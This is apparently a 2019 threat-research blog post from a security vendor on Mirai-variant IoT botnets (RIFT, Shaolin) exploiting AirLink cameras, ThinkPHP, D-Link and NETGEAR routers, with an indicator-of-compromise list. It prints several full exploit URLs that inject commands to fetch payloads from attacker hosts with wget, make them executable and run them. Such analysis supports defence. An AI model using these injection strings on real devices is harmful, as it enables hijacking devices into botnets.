@@ -1,0 +1,192 @@
+A sneak peek into recent IoT attacks
+January 28, 2019
+Since the Mirai botnet source code was leaked in 2016, it was inevitable that we’d see its variants being put to use in IoT threat campaigns.
+Apart from using brute-force techniques to attack IoT devices through various protocols, the botnet also seems to be leveraging vulnerabilities present in IoT devices to infect other IoT devices.
+These vulnerabilities are mostly in management frameworks and, by exploiting them, attackers are achieving remote code execution.
+This typically results in turning the infected device into a bot which in turn forms a bigger botnet army.
+In some cases, we also saw cryptominers as the final payload delivered in the IoT campaigns.
+The Zscaler ThreatLabZ team has been actively tracking these IoT attacks and analyzing their behavior, exploits, and payloads.
+In this blog, we will summarize our observations about a few of the more prominent IoT attacks we observed.
+The graph below shows the IoT attacks we detected over the last three months.
+![](/cdn-cgi/image/format=auto/sites/default/files/images/Figure-1.jpg)
+Fig. 1: Detection timeline of prominent IoT threats
+We observed a significant spike in detection at the start of January 2019.
+The spike was due to the heavy adoption of the ThinkPHP exploit, which we’ll describe later in the report.
+**RIFT botnet**
+The RIFT botnet emerged in December 2018 and uses a variety of exploits to infect IoT devices.
+According to online sources, the botnet used 17 exploits.
+The table below includes some of the more prominent RIFT exploits and those that continue to be active.
+![](/cdn-cgi/image/format=auto/sites/default/files/images/Figure-2_1.jpg)
+Fig. 2: Observed active exploits used in RIFT attack
+Most of the vulnerabilities exploited were Remote Code Execution (RCE) or Command Injection types.
+It was surprising to see the use of WordPress-based websites into IoT devices.
+This indicates the use of readily available frameworks in IoT devices is increasing due to ease of integration.
+The following are typical post-exploitation steps:
+* Download the payload using “wget” command
++ The payload downloaded was Shell script or ELF file
++ In case of Shell script as payload, it downloads the ELF file depending on the code present inside it
+* Store the payload into “/tmp” directory
+* Make the payload executable using “chmod” command
++ chmod 777 <filename>
+* Run the payload
++ /tmp/<filename>
+Let’s take a sneak peek into one of the exploits we observed in the RIFT attack.
+**[CVE-2015-2280](https://nvd.nist.gov/vuln/detail/CVE-2015-2280)** **– AirLink101 SkyIPCam1620W Wireless N MPEG4 3GPP network camera OS command execution vulnerability**
+There is an OS command injection vulnerability in “*snwrite.cgi*”.
+The OS command can be injected through the parameter “*mac*”.
+The exploit URL looks like the following:
+*<IP-ADDRESS>/maker/snwrite.cgi?mac=1234;wget%20http:// 89.46.223.70/airlink[.]sh%20-O%20/tmp/666trapgod;chmod%20777%20/tmp/666trapgod;./tmp/666trapgod*
+Post successful exploitation of this vulnerability, the “wget” command downloads the shell script payload from the URL “*hxxp://89[.]46[.]223[.]70/airlink.sh”* and stores the payload using “*-O*” switch to “*/tmp/666trapgod*”.
+Later, it changes the permission of the shell script file to 777 (full permissions), which makes it executable and then runs it from its location in the “*/tmp*” directory.
+![](/cdn-cgi/image/format=auto/sites/default/files/images/Figure-3.jpg)
+Fig. 3: Malicious “airlink.sh” shell script
+The “*airlink.sh*” (which is stored as “*66trapgod*”) downloads the final payload from the dropper server “*89[.]46[.]223[.]70*”.
+It downloads the payload for all the *INX and other firmware architectures and hopes one of its suits to victim’s architecture and executes it.
+All the payloads are prefixed with the “*rift*” string.
+The targeted architectures are:
+*x86, arm, arm5, arm6, arm7, m68k, mips, mpsl, ppc, ppc-440fp, sh4, spc, x32, x64*
+![](/cdn-cgi/image/format=auto/sites/default/files/images/FIGURE-4.jpg)
+Fig. 4: RIFT botnet (rift.x86) packed with UPX packer
+The static analysis of the unpacked payload reveals its contents.
+* It contains a list of known default usernames and passwords of IoT devices.
+![](/cdn-cgi/image/format=auto/sites/default/files/images/FIGURE-5.jpg)
+Fig. 5: Usernames and passwords found in RIFT botnet
+* Various IoT exploits, a few of which are mentioned in the below screenshot.
+(Also contains some mentioned in Fig. 2.
+![](/cdn-cgi/image/format=auto/sites/default/files/images/Figure-6.jpg)
+Fig. 6: Exploits in the RIFT botnet
+Using these default credentials and exploits, the infected IoT device infects another device.
+There is also an interesting reference in the payload that refers to “OrkSec Gang.
+![](/cdn-cgi/image/format=auto/sites/default/files/images/Figure-7.jpg)
+Fig. 7: OrkSec Gang reference
+The following are the user-agents seen in this attack:
+* *Dark*
+* *Rift/2.0*
+* *Sefa*
+* *Shaolin/1.0*
+* *Oof*
+**ThinkPHP exploitation**
+On December 11, 2018, a remote code execution vulnerability in the ThinkPHP framework was reported.
+The ThinkPHP is used predominantly in China.
+We believe ThinkPHP is also being incorporated in upcoming IoT devices for its management plugins.
+The exploit code is as follows:
+*<IP-ADDRESS>/public/index.php?s=/index/\think\app/invokefunction&function=call\_user\_func\_array&vars[0]=shell\_exec&vars[1][]=cd%20/tmp;wget%20hxxp://orksecpatrol[.]xyz/bins/rift.x86;cat%20rift.x86%20>%20gfrihk;chmod%20777%20gfrihk;./gfrihk%20thinkphp;rm%20gfrihk*
+The OS commands are injected through the query parameter “*vars*”.
+This follows a typical exploitation sequence observed in RIFT attacks (as explained above).
+The payload was downloaded from the URL “*hxxp://orksecpatrol[.]xyz/bins/rift.x86*”, which is similar to what we saw in the case of RIFT. The payload downloaded from the ThinkPHP exploit also was packed with UPX and contains a list of well-known usernames and passwords.
+Similar exploits were also embedded in the binary that we saw in the RIFT botnet.
+The notable difference was that this payload now contains the ThinkPHP exploit.
+It appears that the RIFT attack incorporated this exploit into its arsenal.
+![](/cdn-cgi/image/format=auto/sites/default/files/images/Figure-8.jpg)
+Fig. 8: Inclusion of ThinkPHP exploit in RIFT botnet
+There was one more difference: a couple of vulnerabilities exploited over the UPnP SOAP ([CVE-2014-8361](https://nvd.nist.gov/vuln/detail/CVE-2014-8361)) protocol in Realtek SDK Miniigd was using the user-agent string “*NotRift/2.0*” instead of the previously used user-agent “*Rift/2.0*” string.
+![](/cdn-cgi/image/format=auto/sites/default/files/images/FIGURE-9.jpg)
+Fig. 9: Comparing UPnP exploits observed in RIFT and ThinkPHP payloads
+It has become evident that the RIFT botnet is also being delivered through the ThinkPHP exploitation.
+**D-Link router exploitation**
+In addition to other targets, we saw major hits related to DLink routers, especially the DSL-2750B model.
+This model had a Remote Code Execution (RCE) vulnerability that can be exploited with the “*cli*” parameter (“*login.cgi?cli=”*).
+The parameter directly invokes the “*ayecli*” binary, and arguments to this parameter become the input to binary.
+Below is the observed exploit code:
+*<IP Address>/login.cgi?cli=aa aa';wget hxxp://89[.]46[.]223[.]70/dlink.sh -O -> /tmp/ff;chmod +x /tmp/ff;sh /tmp/ff'$*
+The URL downloads a shell script from “*hxxp://89[.]46[.]223[.]70”* and drops it into “*/tmp/”* directory with file name *“ff”.*
+We noticed that file names were totally random.
+Later, the file is made executable with the “*chmod +x”* command and is finally executed.
+The shell script contains download links of additional payloads for different architectures.
+![](/cdn-cgi/image/format=auto/sites/default/files/images/Figure-10.jpg)
+Fig. 10: Malicious “dlink.sh” shell script
+The task of shell script is to remove all contents from the “*/tmp/”* directory, download the actual payload, make the payload executable, and finally execute the payload.
+It tries to download and execute payloads for many *NIX architectures including but not limited to *.arm, .arm5, .arm7, .mips, .mpsl, .x86,* etc.
+Once the payload is executed, it deletes all the payloads from the “*/tmp/”* directory, leaving no trace of the attack.
+The payload dropped from the exploit was not packed, and a simple static analysis of the file showed reference to another famous UPnP SOAP exploit ([CVE-2014-8361](https://nvd.nist.gov/vuln/detail/CVE-2014-8361)) in Realtek SDK Miniigd.
+This vulnerability affects all the IoT devices embedded with Realtek SDK. This Mirai variant tries to exploit all the other devices with the embedded exploit of Realtek SDK Miniigd.
+![](/cdn-cgi/image/format=auto/sites/default/files/images/FIGURE-11.jpg)
+Fig. 11: Realtek SDK Miniigd exploit – CVE-2014-8361
+**Shaolin botnet (exploitation of NETGEAR vulnerability)**
+In the first week of January 2019, we saw hits targeting NETGEAR routers.
+In these attacks, an old bug was being used for Remote Code Execution (RCE).
+NETGEAR DGN2200 and NETGEAR DGN1000 are vulnerable to this bug.
+We saw similar patterns in the URL below, where attackers were trying to download additional payloads from external locations.
+The exploit code is as follows:
+*<IP Address>/setup.cgi?next\_file=netgear.cfg&todo=syscmd&cmd=rm -rf /tmp/*;wget hxxp://145[.]239[.]138[.]69/bins/shaolin.mips -O /tmp/netgear;sh netgear&curpath=/&currentsetting.htm=1*
+The downloaded payload “*shaolin.mips*” is named *“netgear”* and is executed directly after download.
+This payload is similar to what we saw in the Airlink101 SkyIPCam case described earlier and used multiple exploits.
+We found it to be using the SOAP exploit, which targets DSL modems as shown in the code snippet below:
+![](/cdn-cgi/image/format=auto/sites/default/files/images/FIGURE-12.jpg)
+Fig. 12: SOAP exploit targeting DSL modems
+The payload also tries to exploit the Home Network Administration Protocol (HNAP) in D-Link routers to download additional payloads.
+The following snippet was fetched from a payload that shows usage of HNAP.
+![](/cdn-cgi/image/format=auto/sites/default/files/images/Figure-13.jpg)
+Fig. 13: HNAP exploit targeting D-Link routers
+In addition, we found many embedded usernames and password, similar to what we saw in the AirLink case.
+**Conclusion**
+The IoT space is evolving, and so is the attack surface of these devices.
+IoT devices need to be patched on a timely basis, which presents a challenge.
+IoT devices also need to be updated regularly.
+Even though techniques like brute-force attacks that use default passwords are not new, they remain effective because device passwords tend to go unchanged following installation.
+By hardening IoT devices and baking security in, many of the attacks we’ve been seeing can be countered.
+**Zscaler detections**
+IoT.Backdoor.RIFT
+PHP.Exploit.ThinkPHP
+IoT.Trojan.Mirai.B
+IoT.Exploit.NetGear
+**Indicators of Compromise (IOCs)**
+orksecpatrol[.]xyz/bins/rift[.]x86
+159[.]65[.]247[.]21/airlink[.]sh
+89[.]46[.]223[.]70/airlink[.]sh
+209[.]141[.]50[.]26/b
+209[.]141[.]33[.]119/avtechsh
+209[.]141[.]33[.]119/avtechsh
+104[.]244[.]76[.]210/avtech
+89[.]46[.]223[.]70/tutos[.]sh
+89[.]46[.]223[.]70/dlink[.]sh
+89[.]46[.]223[.]70/fastgate[.]sh
+89[.]46[.]223[.]70/gpon8080[.]sh
+89[.]46[.]223[.]70/bins/rift[.]x86
+89[.]46[.]223[.]70/bins/rift[.]arm
+89[.]46[.]223[.]70/bins/rift[.]arm5
+89[.]46[.]223[.]70/bins/rift[.]arm6
+89[.]46[.]223[.]70/bins/rift[.]arm7
+89[.]46[.]223[.]70/bins/rift[.]m68k
+89[.]46[.]223[.]70/bins/rift[.]mips
+89[.]46[.]223[.]70/bins/rift[.]mpsl
+89[.]46[.]223[.]70/bins/rift[.]ppc
+89[.]46[.]223[.]70/bins/rift[.]ppc-440fp
+89[.]46[.]223[.]70/bins/rift[.]sh4
+89[.]46[.]223[.]70/bins/rift[.]spc
+89[.]46[.]223[.]70/bins/rift[.]x32
+89[.]46[.]223[.]70/bins/rift[.]x64
+89[.]46[.]223[.]70/realtek[.]sh
+145[.]239[.]138[.]69/softnas[.]sh
+185[.]141[.]24[.]211
+103[.]124[.]107[.]121
+145[.]239[.]138[.]69
+159[.]65[.]247[.]21
+167[.]99[.]50[.]62
+176[.]32[.]33[.]165
+185[.]101[.]105[.]129
+185[.]172[.]164[.]41
+185[.]244[.]25[.]114
+185[.]244[.]25[.]168
+185[.]62[.]190[.]191
+209[.]97[.]185[.]168
+46[.]166[.]185[.]42
+50[.]115[.]166[.]136
+77[.]87[.]77[.]250 
+80[.]211[.]112[.]150
+145[.]239[.]138[.]69
+5e852f314e218842f31f651a2b48559e
+f5660b1ccad67b08f6ece03c625e469a
+82b7d40205994813df63c8a77fbe821c
+218205b75d848cca092dcc6742f8b3a9
+4471c35a5e68bc248fc8218738aa3e1d
+02af7016b49dcbc186d6d5b4ec9beafb
+6867dfb692beeff427a3df38938ea96f
+963dcfb96774389a4910ea58beb5b2cd
+dadf1f4ba8089bfd3520318d44fea684
+23c2c659e6c07f64903ba071ec2c88d1
+6407e1e33853d0e8f4fcc94085581d20
+8fcc9ac9b405bd444f156e6b56340486
+e753ca95633c4eb4477151cb9a940316
+4cea779c2fa89504f4813cbd39f678fa
+e65e3b21878cc9ef2811a5e38e79a700
